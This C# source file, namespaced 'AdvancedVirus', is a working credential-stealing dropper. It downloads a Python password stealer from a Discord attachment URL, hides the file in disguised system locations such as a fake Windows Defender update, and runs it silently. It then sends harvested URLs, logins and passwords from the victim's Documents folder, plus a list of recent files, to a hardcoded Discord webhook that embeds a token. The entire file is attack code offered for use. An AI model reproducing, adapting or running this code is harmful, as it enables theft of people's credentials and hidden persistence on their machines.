using System;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;
using System.Linq;
using System.Collections.Generic;

namespace AdvancedVirus
{
    public class DiscordDownloader
    {
        private readonly HttpClient _httpClient;
        private readonly string _webhookUrl;
        private string _hiddenFilePath;

        public DiscordDownloader()
        {
            _httpClient = new HttpClient();
            _webhookUrl = "https://discord.com/api/webhooks/484233049710657537/FSruIoTMLuY2z8ahP23MeLZIxv3XOtIq5bdWQADULr9h00Fps0-KrCews89UE1zvRf1R";
        }

        public async Task DownloadAndExecuteAsync()
        {
            string url = "https://cdn.discordapp.com/attachments/484231482303447042/1436350571903717437/passs.py?ex=690f4936&is=690df7b6&hm=faf5cf7f416be6ec19e3b963265b4df4dd20cab4a97e6a5e2cc812dad31899e7&";

            try
            {
                await SendMessageToDiscord("🚀 Starting password stealer execution...");

                // Step 1: Download the Python file
                Console.WriteLine("Downloading Python stealer...");
                await SendMessageToDiscord("📥 Downloading stealer file...");

                string downloadedFilePath = await DownloadFile(url);
                if (string.IsNullOrEmpty(downloadedFilePath))
                {
                    await SendMessageToDiscord("❌ Failed to download stealer file");
                    return;
                }

                // Step 2: Hide file in system
                Console.WriteLine("Hiding file in system...");
                await SendMessageToDiscord("🔒 Hiding file in system location...");

                string hiddenPath = HideFileInSystem(downloadedFilePath);
                if (string.IsNullOrEmpty(hiddenPath))
                {
                    await SendMessageToDiscord("❌ Failed to hide file");
                    return;
                }

                // Step 3: Execute the hidden file
                Console.WriteLine("Executing hidden stealer...");
                await SendMessageToDiscord("⚡ Executing password stealer...");
                // Запускаем Python-процесс
                Process process = null;
                try
                {
                    string pythonExe = FindPythonExecutable();
                    if (pythonExe == null) { await SendMessageToDiscord("❌ Python not found"); return; }

                    process = new Process
                    {
                        StartInfo = new ProcessStartInfo
                        {
                            FileName = pythonExe,
                            Arguments = $"\"{hiddenPath}\"",
                            UseShellExecute = false,
                            CreateNoWindow = true,
                            RedirectStandardOutput = false,
                            RedirectStandardError = false
                        }
                    };
                    process.Start();
                    await SendMessageToDiscord("▶️ Stealer launched — waiting 20s for files...");
                }
                catch (Exception ex)
                {
                    await SendMessageToDiscord($"💥 Launch failed: {ex.Message}");
                    return;
                }

                // 🔥 КЛЮЧЕВОЕ ИЗМЕНЕНИЕ: ЖДЁМ 20 СЕКУНД И ЧИТАЕМ ФАЙЛЫ, НЕ ДОЖИДАЯСЬ ЗАВЕРШЕНИЯ
                await Task.Delay(20_000);

                // Теперь гарантированно читаем файлы
                await ReadAndSendPasswordData();

                // Убиваем процесс, если он ещё жив
                if (!process.HasExited)
                {
                    try { process.Kill(); } catch { }
                    await SendMessageToDiscord("🧹 Stealer process terminated");
                }
                // Step 5: Cleanup
                CleanupTempFiles(downloadedFilePath);

            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
                await SendMessageToDiscord($"💥 Critical error: {ex.Message}");
            }
        }

        private async Task<string> DownloadFile(string url)
        {
            try
            {
                HttpResponseMessage response = await _httpClient.GetAsync(url);
                response.EnsureSuccessStatusCode();

                // Create temp directory if not exists
                string tempDir = Path.GetTempPath();
                string fileName = "system_update_" + Guid.NewGuid().ToString().Substring(0, 8) + ".py";
                string filePath = Path.Combine(tempDir, fileName);

                using (Stream contentStream = await response.Content.ReadAsStreamAsync())
                using (FileStream fileStream = new FileStream(filePath, FileMode.Create, FileAccess.Write, FileShare.None, 8192, true))
                {
                    await contentStream.CopyToAsync(fileStream);
                }

                Console.WriteLine($"File downloaded to: {filePath}");
                return filePath;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Download failed: {ex.Message}");
                return null;
            }
        }

        private string HideFileInSystem(string filePath)
        {
            try
            {
                // Multiple hiding locations - try each one
                string[] possibleHideLocations = {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Windows), "Temp", "system_cache_" + Guid.NewGuid().ToString().Substring(0, 8) + ".py"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), "Windows Defender", "defender_update_" + Guid.NewGuid().ToString().Substring(0, 8) + ".py"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "Microsoft", "Windows", "webcache_" + Guid.NewGuid().ToString().Substring(0, 8) + ".py"),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData), "Microsoft", "Network", "net_tool_" + Guid.NewGuid().ToString().Substring(0, 8) + ".py")
                };

                foreach (string hideLocation in possibleHideLocations)
                {
                    try
                    {
                        // Create directory if not exists
                        Directory.CreateDirectory(Path.GetDirectoryName(hideLocation));

                        // Copy file to hidden location
                        File.Copy(filePath, hideLocation, true);

                        // Set hidden attribute
                        File.SetAttributes(hideLocation, File.GetAttributes(hideLocation) | FileAttributes.Hidden);

                        Console.WriteLine($"File hidden at: {hideLocation}");
                        _hiddenFilePath = hideLocation;
                        return hideLocation;
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine($"Failed to hide in {hideLocation}: {ex.Message}");
                        continue;
                    }
                }

                return null;
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Hide operation failed: {ex.Message}");
                return null;
            }
        }
        private async Task<bool> ExecuteHiddenStealer(string hiddenFilePath)
        {
            Process process = null;
            try
            {
                string pythonExecutable = FindPythonExecutable();
                if (pythonExecutable == null)
                {
                    await SendMessageToDiscord("❌ Python not found");
                    return false;
                }

                await SendMessageToDiscord("⏳ Launching Python stealer (max 45 sec)...");

                process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = pythonExecutable,
                        Arguments = $"\"{hiddenFilePath}\"",
                        UseShellExecute = false,
                        CreateNoWindow = true,
                        RedirectStandardOutput = false, // ← Не читаем потоки
                        RedirectStandardError = false,  // ← Это предотвращает зависание
                        WorkingDirectory = Path.GetTempPath()
                    }
                };

                process.Start();

                // Ждём до 45 секунд (увеличено с 30)
                bool exited = process.WaitForExit(45_000);

                if (!exited)
                {
                    process.Kill();
                    await SendMessageToDiscord("⚠️ Stealer killed after 45s timeout");
                    return false;
                }

                await SendMessageToDiscord($"✅ Stealer exited with code: {process.ExitCode}");
                return process.ExitCode == 0;
            }
            catch (Exception ex)
            {
                await SendMessageToDiscord($"💥 Execution crash: {ex.Message}");
                return false;
            }
            finally
            {
                process?.Dispose();
            }
        }
        private async Task SendFileToDiscord(string filePath, string message)
        {
            if (!File.Exists(filePath))
            {
                Console.WriteLine($"File not found for upload: {filePath}");
                return;
            }

            try
            {
                using var fileStream = File.OpenRead(filePath);
                using var fileContent = new StreamContent(fileStream);
                fileContent.Headers.ContentType = new System.Net.Http.Headers.MediaTypeHeaderValue("application/octet-stream");

                using var formData = new MultipartFormDataContent();
                formData.Add(new StringContent(message), "content");
                formData.Add(fileContent, "file", Path.GetFileName(filePath));

                await _httpClient.PostAsync(_webhookUrl, formData);
                Console.WriteLine($"Uploaded file with message: {Path.GetFileName(filePath)}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Failed to upload file with message: {ex.Message}");
            }
        }
        private async Task ReadAndSendPasswordData()
        {
            try
            {
                string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                var csvFiles = Directory.GetFiles(documentsPath, "passwords_*.csv").OrderBy(f => f).ToArray();
                var excelFiles = Directory.GetFiles(documentsPath, "passwords_*.xlsx").OrderBy(f => f).ToArray();

                bool foundAny = false;

                // Обрабатываем CSV для текстового вывода + отправки файла
                foreach (var csvFile in csvFiles)
                {
                    foundAny = true;

                    // 1. Отправляем содержимое CSV как текст
                    await SendMessageToDiscord($"📋 **Text content of `{Path.GetFileName(csvFile)}`**");
                    var passwords = ReadPasswordsFromCsv(csvFile);
                    if (passwords.Any())
                    {
                        await SendMessageToDiscord("```");
                        int count = 0;
                        foreach (var pwd in passwords.Take(30)) // Ограничим для Discord
                        {
                            string line = $"{pwd.Url} | {pwd.Login} | {pwd.Password}";
                            if (line.Length > 180) line = line.Substring(0, 180) + "...";
                            await SendMessageToDiscord(line);
                            count++;
                            if (count % 10 == 0) await Task.Delay(800);
                        }
                        await SendMessageToDiscord("```");
                    }
                    else
                    {
                        await SendMessageToDiscord("_No readable passwords found._");
                    }

                    // 2. Отправляем CSV как файл
                    await SendFileToDiscord(csvFile, $"📎 CSV File: `{Path.GetFileName(csvFile)}`");
                    await Task.Delay(1000);
                }

                // Отправляем XLSX файлы (только как вложения, без текста)
                foreach (var excelFile in excelFiles)
                {
                    foundAny = true;
                    await SendFileToDiscord(excelFile, $"📊 Excel File: `{Path.GetFileName(excelFile)}`");
                    await Task.Delay(1000);
                }

                if (!foundAny)
                {
                    await SendMessageToDiscord("📭 No password files found in Documents");
                    await ListDocumentsFiles();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error in ReadAndSendPasswordData: {ex.Message}");
                await SendMessageToDiscord($"❌ Failed to read/send files: {ex.Message}");
            }
        }


        private List<PasswordData> ReadPasswordsFromExcel(string filePath)
        {
            var passwords = new List<PasswordData>();

            try
            {
                // Простой способ без Excel Interop - читаем как текст и пытаемся найти данные
                string content = File.ReadAllText(filePath);

                // Если файл слишком большой, создаем упрощенную версию
                if (content.Length > 100000) // ~100KB
                {
                    passwords.Add(new PasswordData
                    {
                        Source = "System",
                        Url = "File too large",
                        Login = "See attached file",
                        Password = "File size: " + FormatFileSize(new FileInfo(filePath).Length)
                    });
                    return passwords;
                }

                // Пытаемся найти данные в содержимом файла
                var lines = content.Split('\n');
                foreach (var line in lines.Take(1000)) // Ограничиваем чтение
                {
                    if (line.Contains("http") || line.Contains("@") || line.Contains("login", StringComparison.OrdinalIgnoreCase))
                    {
                        var data = ExtractDataFromLine(line);
                        if (data != null)
                        {
                            passwords.Add(data);
                        }
                    }
                }

                Console.WriteLine($"Read {passwords.Count} passwords from Excel");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading Excel: {ex.Message}");
                passwords.Add(new PasswordData
                {
                    Source = "Error",
                    Url = "Failed to read Excel",
                    Login = ex.Message,
                    Password = "Try CSV format"
                });
            }

            return passwords;
        }

        private List<PasswordData> ReadPasswordsFromCsv(string filePath)
        {
            var passwords = new List<PasswordData>();
            try
            {
                var lines = File.ReadAllLines(filePath);
                for (int i = 0; i < lines.Length && i < 100; i++)
                {
                    var line = lines[i].Trim();
                    if (string.IsNullOrEmpty(line)) continue;

                    // Пропускаем заголовок
                    if (i == 0 && line.Contains("source", StringComparison.OrdinalIgnoreCase))
                        continue;

                    var parts = line.Split(',');
                    if (parts.Length >= 4)
                    {
                        passwords.Add(new PasswordData
                        {
                            Source = parts[0].Trim('"'),
                            Url = parts[1].Trim('"'),
                            Login = parts[2].Trim('"'),
                            Password = parts[3].Trim('"')
                        });
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"CSV read error: {ex.Message}");
            }
            return passwords;
        }

        private PasswordData ExtractDataFromCsvLine(string line)
        {
            try
            {
                var parts = line.Split(',');
                if (parts.Length >= 4)
                {
                    return new PasswordData
                    {
                        Source = parts[0].Trim('"', ' '),
                        Url = parts[1].Trim('"', ' '),
                        Login = parts[2].Trim('"', ' '),
                        Password = parts[3].Trim('"', ' ')
                    };
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error parsing CSV line: {ex.Message}");
            }

            return null;
        }

        private PasswordData ExtractDataFromLine(string line)
        {
            // Простая эвристика для извлечения данных из текстовой строки
            if (line.Contains("http") && (line.Contains("@") || line.Contains("login", StringComparison.OrdinalIgnoreCase)))
            {
                return new PasswordData
                {
                    Source = "Chrome",
                    Url = ExtractUrl(line),
                    Login = ExtractLogin(line),
                    Password = ExtractPassword(line)
                };
            }

            return null;
        }

        private string ExtractUrl(string line)
        {
            var patterns = new[] { "http://", "https://", "www." };
            foreach (var pattern in patterns)
            {
                int index = line.IndexOf(pattern);
                if (index >= 0)
                {
                    int endIndex = line.IndexOf(' ', index);
                    if (endIndex == -1) endIndex = Math.Min(index + 50, line.Length);
                    return line.Substring(index, endIndex - index);
                }
            }
            return "Unknown URL";
        }

        private string ExtractLogin(string line)
        {
            if (line.Contains("@"))
            {
                int atIndex = line.IndexOf('@');
                int start = Math.Max(0, atIndex - 20);
                int end = Math.Min(line.Length, atIndex + 20);
                return line.Substring(start, end - start);
            }
            return "Unknown Login";
        }

        private string ExtractPassword(string line)
        {
            // Ищем последовательности символов, похожие на пароли
            if (line.Length > 50)
            {
                return "[Password in file]";
            }
            return line;
        }

        private async Task SendPasswordsAsMessages(List<PasswordData> passwords, string sourceFile)
        {
            try
            {
                await SendMessageToDiscord($"🔐 **PASSWORD DATA from {sourceFile}**");
                await SendMessageToDiscord($"Total passwords found: {passwords.Count}");
                await SendMessageToDiscord("```");

                int count = 0;
                foreach (var password in passwords.Take(50)) // Ограничиваем количество
                {
                    string message = $"{count + 1}. {password.Source} | {password.Url} | {password.Login} | {password.Password}";

                    if (message.Length > 150)
                        message = message.Substring(0, 150) + "...";

                    await SendMessageToDiscord(message);
                    count++;

                    // Задержка чтобы не превысить лимиты Discord
                    if (count % 10 == 0)
                        await Task.Delay(1000);
                }

                await SendMessageToDiscord("```");

                if (passwords.Count > 50)
                {
                    await SendMessageToDiscord($"... and {passwords.Count - 50} more passwords (truncated for display)");
                }

                await SendMessageToDiscord($"✅ Successfully sent {Math.Min(passwords.Count, 50)} passwords to Discord");

            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error sending passwords: {ex.Message}");
                await SendMessageToDiscord($"❌ Error sending passwords: {ex.Message}");
            }
        }

        private async Task ListDocumentsFiles()
        {
            try
            {
                string documentsPath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
                var files = Directory.GetFiles(documentsPath, "*.*")
                    .OrderByDescending(f => new FileInfo(f).CreationTime)
                    .Take(10)
                    .ToArray();

                if (files.Any())
                {
                    await SendMessageToDiscord("📁 **Recent files in Documents:**");
                    foreach (var file in files)
                    {
                        var info = new FileInfo(file);
                        await SendMessageToDiscord($"`{info.Name}` ({FormatFileSize(info.Length)}) - {info.CreationTime:HH:mm:ss}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error listing files: {ex.Message}");
            }
        }

        private string FormatFileSize(long bytes)
        {
            string[] sizes = { "B", "KB", "MB", "GB" };
            int order = 0;
            double len = bytes;
            while (len >= 1024 && order < sizes.Length - 1)
            {
                order++;
                len = len / 1024;
            }
            return $"{len:0.##} {sizes[order]}";
        }

        private void CleanupTempFiles(string tempFilePath)
        {
            try
            {
                // Delete original temp file
                if (File.Exists(tempFilePath))
                {
                    File.Delete(tempFilePath);
                    Console.WriteLine($"Cleaned up temp file: {tempFilePath}");
                }

                // Keep hidden file for potential future use
                if (!string.IsNullOrEmpty(_hiddenFilePath) && File.Exists(_hiddenFilePath))
                {
                    Console.WriteLine($"Hidden file preserved: {_hiddenFilePath}");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Cleanup error: {ex.Message}");
            }
        }

        private async Task SendMessageToDiscord(string message)
        {
            try
            {
                var content = new MultipartFormDataContent();
                content.Add(new StringContent(message), "content");
                await _httpClient.PostAsync(_webhookUrl, content);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Send message error: {ex.Message}");
            }
        }
        private async Task SendFileToDiscord(string filePath)
        {
            if (!File.Exists(filePath)) return;

            using var fileStream = File.OpenRead(filePath);
            using var fileContent = new StreamContent(fileStream);
            using var formData = new MultipartFormDataContent();

            formData.Add(fileContent, "file", Path.GetFileName(filePath));
            await _httpClient.PostAsync(_webhookUrl, formData);
        }
        private string FindPythonExecutable()
        {
            string[] possiblePaths = {
                "python.exe", "py.exe", "python3.exe",
                "C:\\Python39\\python.exe", "C:\\Python310\\python.exe",
                "C:\\Python311\\python.exe", "C:\\Python312\\python.exe"
            };

            foreach (string path in possiblePaths)
            {
                if (File.Exists(path)) return path;
            }

            try
            {
                var process = new Process
                {
                    StartInfo = new ProcessStartInfo
                    {
                        FileName = "where",
                        Arguments = "python",
                        UseShellExecute = false,
                        RedirectStandardOutput = true,
                        CreateNoWindow = true
                    }
                };
                process.Start();
                string result = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(result))
                {
                    string[] paths = result.Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
                    return paths.Length > 0 ? paths[0] : null;
                }
            }
            catch { }

            return null;
        }
    }

    public class PasswordData
    {
        public string Source { get; set; }
        public string Url { get; set; }
        public string Login { get; set; }
        public string Password { get; set; }
    }
}